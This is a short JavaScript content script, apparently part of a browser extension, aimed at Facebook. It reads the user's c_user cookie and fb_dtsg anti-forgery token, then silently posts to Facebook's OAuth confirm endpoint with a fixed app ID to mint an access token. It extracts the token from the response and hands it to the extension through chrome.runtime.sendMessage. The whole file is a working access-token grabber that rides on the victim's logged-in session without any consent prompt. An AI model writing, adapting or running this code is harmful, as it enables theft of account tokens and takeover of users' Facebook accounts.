var uid = document.cookie.match(/c_user=(\d+)/)[1];
var dtsg = document.getElementsByName("fb_dtsg")[0].value;
var http = new XMLHttpRequest;
var url = "//www.facebook.com/v1.0/dialog/oauth/confirm";
var params = "fb_dtsg=" + dtsg + "&app_id=165907476854626&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=page&access_token=&from_post=1&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1&__user=" + uid;

http.open("POST", url, !0), http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.onreadystatechange = function() {
	if (4 == http.readyState && 200 == http.status) {
	    var a = http.responseText.match(/access_token=(.*)(?=&expires_in)/);
	    if (a) {
	    	a = a[1];
	    	chrome.runtime.sendMessage({ accessToken: a });
	    }else {
	    	alert('Please open your facebook first!')
	    }
	}
};
http.send(params); 